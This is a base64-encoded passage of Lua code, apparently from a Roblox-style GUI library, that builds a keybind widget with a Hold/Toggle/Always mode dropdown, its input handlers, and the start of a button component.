ICAgICAgICBQYXJlbnQgPSBpdGVtc1sgInJpZ2h0X2NvbXBvbmVudHMiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIFBhZGRpbmcgPSBkaW0oMCwgNyk7CiAgICAgICAgICAgICAgICAgICAgICAgIFNvcnRPcmRlciA9IEVudW0uU29ydE9yZGVyLkxheW91dE9yZGVyCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaXRlbXNbICJrZXliaW5kX2hvbGRlciIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiVGV4dEJ1dHRvbiIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIEZvbnRGYWNlID0gZm9udHMuZm9udDsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dENvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0ID0gIiI7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAicmlnaHRfY29tcG9uZW50cyIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgQXV0b0J1dHRvbkNvbG9yID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgICAgIEFuY2hvclBvaW50ID0gdmVjMigxLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMCwgMCwgMCwgMTYpOwogICAgICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDEsIDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgICAgICBBdXRvbWF0aWNTaXplID0gRW51bS5BdXRvbWF0aWNTaXplLlg7CiAgICAgICAgICAgICAgICAgICAgICAgIFRleHRTaXplID0gMTQ7CiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMzMsIDMzLCAzNSkKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJQ29ybmVyIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJrZXliaW5kX2hvbGRlciIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgQ29ybmVyUmFkaXVzID0gZGltKDAsIDQpCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaXRlbXNbICJrZXkiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIlRleHRMYWJlbCIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIEZvbnRGYWNlID0gZm9udHMuZm9udDsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dENvbG9yMyA9IHJnYig4NiwgODYsIDg3KTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0ID0gIkxTSElGVCI7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAia2V5YmluZF9ob2xkZXIiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAtMTIsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dFhBbGlnbm1lbnQgPSBFbnVtLlRleHRYQWxpZ25tZW50LkxlZnQ7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgIEF1dG9tYXRpY1NpemUgPSBFbnVtLkF1dG9tYXRpY1NpemUuWFk7CiAgICAgICAgICAgICAgICAgICAgICAgIFRleHRTaXplID0gMTQ7CiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMjU1LCAyNTUsIDI1NSkKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJUGFkZGluZyIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAia2V5IiBdOwogICAgICAgICAgICAgICAgICAgICAgICBQYWRkaW5nVG9wID0gZGltKDAsIDEpOwogICAgICAgICAgICAgICAgICAgICAgICBQYWRkaW5nUmlnaHQgPSBkaW0oMCwgNSk7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhZGRpbmdMZWZ0ID0gZGltKDAsIDUpCiAgICAgICAgICAgICAgICAgICAgfSk7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgLS0gCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIC0tIE1vZGUgSG9sZGVyCiAgICAgICAgICAgICAgICAgICAgaXRlbXNbICJkcm9wZG93biIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiRnJhbWUiICwgewogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGxpYnJhcnkuaXRlbXM7CiAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsKICAgICAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDAsIDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigwLCAwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgQXV0b21hdGljU2l6ZSA9IEVudW0uQXV0b21hdGljU2l6ZS5YOwogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDAsIDAsIDApCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaXRlbXNbICJpbmxpbmUiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIkZyYW1lIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJkcm9wZG93biIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMSwgMCwgMSwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgICAgICBDbGlwc0Rlc2NlbmRhbnRzID0gdHJ1ZTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDIyLCAyMiwgMjQpCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSVBhZGRpbmciICwgewogICAgICAgICAgICAgICAgICAgICAgICBQYWRkaW5nQm90dG9tID0gZGltKDAsIDYpOwogICAgICAgICAgICAgICAgICAgICAgICBQYWRkaW5nVG9wID0gZGltKDAsIDMpOwogICAgICAgICAgICAgICAgICAgICAgICBQYWRkaW5nTGVmdCA9IGRpbSgwLCAzKTsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJpbmxpbmUiIF0KICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJTGlzdExheW91dCIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiaW5saW5lIiBdOwogICAgICAgICAgICAgICAgICAgICAgICBQYWRkaW5nID0gZGltKDAsIDUpOwogICAgICAgICAgICAgICAgICAgICAgICBTb3J0T3JkZXIgPSBFbnVtLlNvcnRPcmRlci5MYXlvdXRPcmRlcgogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlDb3JuZXIiICwgewogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImlubGluZSIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgQ29ybmVyUmFkaXVzID0gZGltKDAsIDQpCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgb3B0aW9ucyA9IHsiSG9sZCIsICJUb2dnbGUiLCAiQWx3YXlzIn0KICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBjZmcueV9zaXplID0gMjAKICAgICAgICAgICAgICAgICAgICBmb3IgXywgb3B0aW9uIGluIG9wdGlvbnMgZG8gICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgbmFtZSA9IGxpYnJhcnk6Y3JlYXRlKCAiVGV4dEJ1dHRvbiIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBGb250RmFjZSA9IGZvbnRzLmZvbnQ7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBUZXh0Q29sb3IzID0gcmdiKDcyLCA3MiwgNzMpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgVGV4dCA9IG9wdGlvbjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiaW5saW5lIiBdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigwLCAwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgVGV4dFhBbGlnbm1lbnQgPSBFbnVtLlRleHRYQWxpZ25tZW50LkxlZnQ7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgQXV0b21hdGljU2l6ZSA9IEVudW0uQXV0b21hdGljU2l6ZS5YWTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRleHRTaXplID0gMTQ7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICAgICAgICAgIH0pOyBjZmcuaG9sZF9pbnN0YW5jZXNbb3B0aW9uXSA9IG5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgbGlicmFyeTphcHBseV90aGVtZShuYW1lLCAiYWNjZW50IiwgIlRleHRDb2xvcjMiKQogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgY2ZnLnlfc2l6ZSArPSBuYW1lLkFic29sdXRlU2l6ZS5ZCgogICAgICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJUGFkZGluZyIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBuYW1lOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgUGFkZGluZ1RvcCA9IGRpbSgwLCAxKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBhZGRpbmdSaWdodCA9IGRpbSgwLCA1KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBhZGRpbmdMZWZ0ID0gZGltKDAsIDUpCiAgICAgICAgICAgICAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgICAgICAgICAgICAgbmFtZS5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNmZy5zZXQob3B0aW9uKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNmZy5zZXRfdmlzaWJsZShmYWxzZSkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjZmcub3BlbiA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIC0tIAogICAgICAgICAgICBlbmQgCgogICAgICAgICAgICBpZiBjZmcuc2VwZXJhdG9yIHRoZW4gLS0gb2sgYnJvIG15IGx1YSBlaXRoZXIgc3Vja3Mgb3IgdGhpcyB3YXMgYSBwYWluIGluIHRoZSBhc3MgdG8gbWFrZSAoc2ltcGxlIGlmIHN0YXRlbWVudCBhc3dlbGwg8J+SlCkKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiRnJhbWUiICwgewogICAgICAgICAgICAgICAgICAgIEFuY2hvclBvaW50ID0gdmVjMigwLCAxKTsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBzZWxmLml0ZW1zWyAiZWxlbWVudHMiIF07CiAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDAsIDAsIDEsIDApOwogICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAxLCAwLCAxKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMzYsIDM2LCAzNykKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGZ1bmN0aW9uIGNmZy5tb2RpZnlfbW9kZV9jb2xvcihwYXRoKSAtLSB0cyBzbyBmcmlraW4gdHVmZiDwn5KACiAgICAgICAgICAgICAgICBmb3IgXywgdiBpbiBjZmcuaG9sZF9pbnN0YW5jZXMgZG8gCiAgICAgICAgICAgICAgICAgICAgdi5UZXh0Q29sb3IzID0gcmdiKDcyLCA3MiwgNzIpCiAgICAgICAgICAgICAgICBlbmQgCgogICAgICAgICAgICAgICAgY2ZnLmhvbGRfaW5zdGFuY2VzW3BhdGhdLlRleHRDb2xvcjMgPSB0aGVtZXMucHJlc2V0LmFjY2VudAogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIGZ1bmN0aW9uIGNmZy5zZXRfbW9kZShtb2RlKSAKICAgICAgICAgICAgICAgIGNmZy5tb2RlID0gbW9kZSAKCiAgICAgICAgICAgICAgICBpZiBtb2RlID09ICJBbHdheXMiIHRoZW4KICAgICAgICAgICAgICAgICAgICBjZmcuc2V0KHRydWUpCiAgICAgICAgICAgICAgICBlbHNlaWYgbW9kZSA9PSAiSG9sZCIgdGhlbgogICAgICAgICAgICAgICAgICAgIGNmZy5zZXQoZmFsc2UpCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBmbGFnc1tjZmcuZmxhZ11bIm1vZGUiXSA9IG1vZGUKICAgICAgICAgICAgICAgIGNmZy5tb2RpZnlfbW9kZV9jb2xvcihtb2RlKQogICAgICAgICAgICBlbmQgCgogICAgICAgICAgICBmdW5jdGlvbiBjZmcuc2V0KGlucHV0KQogICAgICAgICAgICAgICAgaWYgdHlwZShpbnB1dCkgPT0gImJvb2xlYW4iIHRoZW4gCiAgICAgICAgICAgICAgICAgICAgY2ZnLmFjdGl2ZSA9IGlucHV0CgogICAgICAgICAgICAgICAgICAgIGlmIGNmZy5tb2RlID09ICJBbHdheXMiIHRoZW4gCiAgICAgICAgICAgICAgICAgICAgICAgIGNmZy5hY3RpdmUgPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbHNlaWYgdG9zdHJpbmcoaW5wdXQpOmZpbmQoIkVudW0iKSB0aGVuIAogICAgICAgICAgICAgICAgICAgIGlucHV0ID0gaW5wdXQuTmFtZSA9PSAiRXNjYXBlIiBhbmQgIk5PTkUiIG9yIGlucHV0CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgY2ZnLmtleSA9IGlucHV0IG9yICJOT05FIgkKICAgICAgICAgICAgICAgIGVsc2VpZiBmaW5kKHsiVG9nZ2xlIiwgIkhvbGQiLCAiQWx3YXlzIn0sIGlucHV0KSB0aGVuIAogICAgICAgICAgICAgICAgICAgIGlmIGlucHV0ID09ICJBbHdheXMiIHRoZW4gCiAgICAgICAgICAgICAgICAgICAgICAgIGNmZy5hY3RpdmUgPSB0cnVlIAogICAgICAgICAgICAgICAgICAgIGVuZCAKCiAgICAgICAgICAgICAgICAgICAgY2ZnLm1vZGUgPSBpbnB1dAogICAgICAgICAgICAgICAgICAgIGNmZy5zZXRfbW9kZShjZmcubW9kZSkgCiAgICAgICAgICAgICAgICBlbHNlaWYgdHlwZShpbnB1dCkgPT0gInRhYmxlIiB0aGVuIAogICAgICAgICAgICAgICAgICAgIGlucHV0LmtleSA9IHR5cGUoaW5wdXQua2V5KSA9PSAic3RyaW5nIiBhbmQgaW5wdXQua2V5IH49ICJOT05FIiBhbmQgbGlicmFyeTpjb252ZXJ0X2VudW0oaW5wdXQua2V5KSBvciBpbnB1dC5rZXkKICAgICAgICAgICAgICAgICAgICBpbnB1dC5rZXkgPSBpbnB1dC5rZXkgPT0gRW51bS5LZXlDb2RlLkVzY2FwZSBhbmQgIk5PTkUiIG9yIGlucHV0LmtleQoKICAgICAgICAgICAgICAgICAgICBjZmcua2V5ID0gaW5wdXQua2V5IG9yICJOT05FIgogICAgICAgICAgICAgICAgICAgIGNmZy5tb2RlID0gaW5wdXQubW9kZSBvciAiVG9nZ2xlIgoKICAgICAgICAgICAgICAgICAgICBpZiBpbnB1dC5hY3RpdmUgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBjZmcuYWN0aXZlID0gaW5wdXQuYWN0aXZlCiAgICAgICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgICAgIGNmZy5zZXRfbW9kZShjZmcubW9kZSkgCiAgICAgICAgICAgICAgICBlbmQgCgogICAgICAgICAgICAgICAgY2ZnLmNhbGxiYWNrKGNmZy5hY3RpdmUpCgogICAgICAgICAgICAgICAgbG9jYWwgdGV4dCA9IHRvc3RyaW5nKGNmZy5rZXkpIH49ICJFbnVtcyIgYW5kIChrZXlzW2NmZy5rZXldIG9yIHRvc3RyaW5nKGNmZy5rZXkpOmdzdWIoIkVudW0uIiwgIiIpKSBvciBuaWwKICAgICAgICAgICAgICAgIGxvY2FsIF9fdGV4dCA9IHRleHQgYW5kICh0b3N0cmluZyh0ZXh0KTpnc3ViKCJLZXlDb2RlLiIsICIiKTpnc3ViKCJVc2VySW5wdXRUeXBlLiIsICIiKSkKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaXRlbXNbICJrZXkiIF0uVGV4dCA9IF9fdGV4dAoKICAgICAgICAgICAgICAgIGZsYWdzW2NmZy5mbGFnXSA9IHsKICAgICAgICAgICAgICAgICAgICBtb2RlID0gY2ZnLm1vZGUsCiAgICAgICAgICAgICAgICAgICAga2V5ID0gY2ZnLmtleSwgCiAgICAgICAgICAgICAgICAgICAgYWN0aXZlID0gY2ZnLmFjdGl2ZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIGZ1bmN0aW9uIGNmZy5zZXRfdmlzaWJsZShib29sKQogICAgICAgICAgICAgICAgbG9jYWwgc2l6ZSA9IGJvb2wgYW5kIGNmZy55X3NpemUgb3IgMAogICAgICAgICAgICAgICAgbGlicmFyeTp0d2VlbihpdGVtc1sgImRyb3Bkb3duIiBdLCB7U2l6ZSA9IGRpbV9vZmZzZXQoaXRlbXNbICJrZXliaW5kX2hvbGRlciIgXS5BYnNvbHV0ZVNpemUuWCwgc2l6ZSl9KQoKICAgICAgICAgICAgICAgIGl0ZW1zWyAiZHJvcGRvd24iIF0uUG9zaXRpb24gPSBkaW1fb2Zmc2V0KGl0ZW1zWyAia2V5YmluZF9ob2xkZXIiIF0uQWJzb2x1dGVQb3NpdGlvbi5YLCBpdGVtc1sgImtleWJpbmRfaG9sZGVyIiBdLkFic29sdXRlUG9zaXRpb24uWSArIGl0ZW1zWyAia2V5YmluZF9ob2xkZXIiIF0uQWJzb2x1dGVTaXplLlkgKyA2MCkKICAgICAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgICAgIGl0ZW1zWyAia2V5YmluZF9ob2xkZXIiIF0uTW91c2VCdXR0b24xRG93bjpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICBpdGVtc1sgImtleSIgXS5UZXh0ID0gIi4uLiIJCgogICAgICAgICAgICAgICAgY2ZnLmJpbmRpbmcgPSBsaWJyYXJ5OmNvbm5lY3Rpb24odWlzLklucHV0QmVnYW4sIGZ1bmN0aW9uKGtleWNvZGUsIGdhbWVfZXZlbnQpICAKICAgICAgICAgICAgICAgICAgICBjZmcuc2V0KGtleWNvZGUuS2V5Q29kZSB+PSBFbnVtLktleUNvZGUuVW5rbm93biBhbmQga2V5Y29kZS5LZXlDb2RlIG9yIGtleWNvZGUuVXNlcklucHV0VHlwZSkKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBjZmcuYmluZGluZzpEaXNjb25uZWN0KCkgCiAgICAgICAgICAgICAgICAgICAgY2ZnLmJpbmRpbmcgPSBuaWwKICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgaXRlbXNbICJrZXliaW5kX2hvbGRlciIgXS5Nb3VzZUJ1dHRvbjJEb3duOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgY2ZnLm9wZW4gPSBub3QgY2ZnLm9wZW4gCgogICAgICAgICAgICAgICAgY2ZnLnNldF92aXNpYmxlKGNmZy5vcGVuKQogICAgICAgICAgICBlbmQpCgogICAgICAgICAgICBsaWJyYXJ5OmNvbm5lY3Rpb24odWlzLklucHV0QmVnYW4sIGZ1bmN0aW9uKGlucHV0LCBnYW1lX2V2ZW50KSAKICAgICAgICAgICAgICAgIGlmIG5vdCBnYW1lX2V2ZW50IHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCBzZWxlY3RlZF9rZXkgPSBpbnB1dC5Vc2VySW5wdXRUeXBlID09IEVudW0uVXNlcklucHV0VHlwZS5LZXlib2FyZCBhbmQgaW5wdXQuS2V5Q29kZSBvciBpbnB1dC5Vc2VySW5wdXRUeXBlCgogICAgICAgICAgICAgICAgICAgIGlmIHNlbGVjdGVkX2tleSA9PSBjZmcua2V5IHRoZW4gCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGNmZy5tb2RlID09ICJUb2dnbGUiIHRoZW4gCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjZmcuYWN0aXZlID0gbm90IGNmZy5hY3RpdmUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNmZy5zZXQoY2ZnLmFjdGl2ZSkKICAgICAgICAgICAgICAgICAgICAgICAgZWxzZWlmIGNmZy5tb2RlID09ICJIb2xkIiB0aGVuIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2ZnLnNldCh0cnVlKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpICAgIAoKICAgICAgICAgICAgbGlicmFyeTpjb25uZWN0aW9uKHVpcy5JbnB1dEVuZGVkLCBmdW5jdGlvbihpbnB1dCwgZ2FtZV9ldmVudCkgCiAgICAgICAgICAgICAgICBpZiBnYW1lX2V2ZW50IHRoZW4gCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIAogICAgICAgICAgICAgICAgZW5kIAoKICAgICAgICAgICAgICAgIGxvY2FsIHNlbGVjdGVkX2tleSA9IGlucHV0LlVzZXJJbnB1dFR5cGUgPT0gRW51bS5Vc2VySW5wdXRUeXBlLktleWJvYXJkIGFuZCBpbnB1dC5LZXlDb2RlIG9yIGlucHV0LlVzZXJJbnB1dFR5cGUKICAgIAogICAgICAgICAgICAgICAgaWYgc2VsZWN0ZWRfa2V5ID09IGNmZy5rZXkgdGhlbgogICAgICAgICAgICAgICAgICAgIGlmIGNmZy5tb2RlID09ICJIb2xkIiB0aGVuIAogICAgICAgICAgICAgICAgICAgICAgICBjZmcuc2V0KGZhbHNlKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgCiAgICAgICAgICAgIGNmZy5zZXQoe21vZGUgPSBjZmcubW9kZSwgYWN0aXZlID0gY2ZnLmFjdGl2ZSwga2V5ID0gY2ZnLmtleX0pICAgICAgICAgICAKICAgICAgICAgICAgY29uZmlnX2ZsYWdzW2NmZy5mbGFnXSA9IGNmZy5zZXQKCiAgICAgICAgICAgIHJldHVybiBzZXRtZXRhdGFibGUoY2ZnLCBsaWJyYXJ5KQogICAgICAgIGVuZAoKICAgICAgICBmdW5jdGlvbiBsaWJyYXJ5OmJ1dHRvbihvcHRpb25zKSAKICAgICAgICAgICAgbG9jYWwgY2ZnID0gewogICAgICAgICAgICAgICAgbmFtZSA9IG9wdGlvbnMubmFtZSBvciAiVGV4dEJveCIsCiAgICAgICAgICAgICAgICBjYWxsYmFjayA9IG9wdGlvbnMuY2FsbGJhY2sgb3IgZnVuY3Rpb24oKSBlbmQsCiAgICAgICAgICAgICAgICBpdGVtcyA9IHt9OwogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICBsb2NhbCBpdGVtcyA9IGNmZy5pdGVtczsgZG8gCiAgICAgICAgICAgICAgICBpdGVtc1sgImJ1dHRvbl9lbGVtZW50IiBdID0gbGlicmFyeTpjcmVhdGUoICJGcmFtZSIgLCB7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gc2VsZi5pdGVtc1sgImVsZW1lbnRzIiBdOwogICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxOwogICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDEsIDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIEF1dG9tYXRpY1NpemUgPSBFbnVtLkF1dG9tYXRpY1NpemUuWTsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaXRlbXNbICJidXR0b24iIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIlRleHRCdXR0b24iICwgewogICAgICAgICAgICAgICAgICAgIEZvbnRGYWNlID0gZm9udHMuZm9udDsKICAgICAgICAgICAgICAgICAgICBUZXh0Q29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBUZXh0ID0gIiI7CiAgICAgICAgICAgICAgICAgICAgQXV0b0J1dHRvbkNvbG9yID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgQW5jaG9yUG9pbnQgPSB2ZWMyKDEsIDApOwogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiYnV0dG9uX2VsZW1lbnQiIF07CiAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDEsIC00LCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAtOCwgMCwgMzApOwogICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgVGV4dFNpemUgPSAxNDsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDMzLCAzMywgMzUpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSUNvcm